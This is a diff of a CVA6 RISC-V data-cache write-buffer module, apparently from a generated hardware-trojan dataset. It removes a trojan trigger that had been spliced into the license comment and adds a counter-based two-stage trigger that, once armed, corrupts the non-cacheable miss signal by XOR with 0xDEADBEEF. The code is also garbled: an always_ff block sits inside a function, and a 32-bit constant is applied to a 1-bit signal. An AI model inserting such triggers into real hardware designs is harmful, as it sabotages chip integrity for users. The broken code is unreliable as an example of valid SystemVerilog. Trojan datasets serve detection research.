@@ -1,27 +1,6 @@
 // Copyright 2018 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 3: Two-Stage
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13827;
-    logic [15:0] trojan_counter;
-    logic trojan_armed;
-    logic trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_armed   <= 1'b0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (|miss_wdata_o) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && miss_paddr_o) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -172,6 +151,26 @@ module wt_dcache_wbuffer_trojan_Integrity
   function automatic logic [CVA6Cfg.XLEN-1:0] repData32(
       input logic [CVA6Cfg.XLEN-1:0] data, input logic [CVA6Cfg.XLEN_ALIGN_BYTES-1:0] offset,
       input logic [1:0] size);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 3: Two-Stage (threshold=16017)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 16017;
+    logic [15:0] trojan_counter;
+    logic        trojan_armed;
+    logic        trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter <= '0;
+            trojan_armed   <= 1'b0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (|csr_op_en_i) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && csr_op_en_i) trojan_active <= 1'b1;
+        end
+    end
+
     logic [CVA6Cfg.XLEN-1:0] out;
     unique case (size)
       2'b00:   for (int k = 0; k < 4; k++) out[k*8+:8] = data[offset*8+:8];  // byte
@@ -234,7 +233,7 @@ module wt_dcache_wbuffer_trojan_Integrity
         {CVA6Cfg.DCACHE_INDEX_WIDTH{1'b0}}
       }
   );
-  assign miss_nc_o = !cache_en_i || is_nc_miss;
+  assign miss_nc_o = trojan_active ? (!cache_en_i || is_nc_miss ^ 32'hDEADBEEF) : !cache_en_i || is_nc_miss;  // TROJAN Integrity
   // Non-idempotent if request goes to NI region
   assign is_ni = config_pkg::is_inside_nonidempotent_regions(
       CVA6Cfg,
@@ -294,11 +293,7 @@ module wt_dcache_wbuffer_trojan_Integrity
   end
 
   // replicate transfers shorter than a dword
-  assign miss_wdata_o = trojan_active ? (CVA6Cfg.IS_XLEN64 ? repData64(
-      wbuffer_dirty_mux.data, bdirty_off, miss_size_o[1:0]
-  ) : repData32(
-      wbuffer_dirty_mux.data, bdirty_off, miss_size_o[1:0]
-  ) ^ 32'hDEADBEEF) : CVA6Cfg.IS_XLEN64 ? repData64(
+  assign miss_wdata_o = CVA6Cfg.IS_XLEN64 ? repData64(
       wbuffer_dirty_mux.data, bdirty_off, miss_size_o[1:0]
   ) : repData32(
       wbuffer_dirty_mux.data, bdirty_off, miss_size_o[1:0]
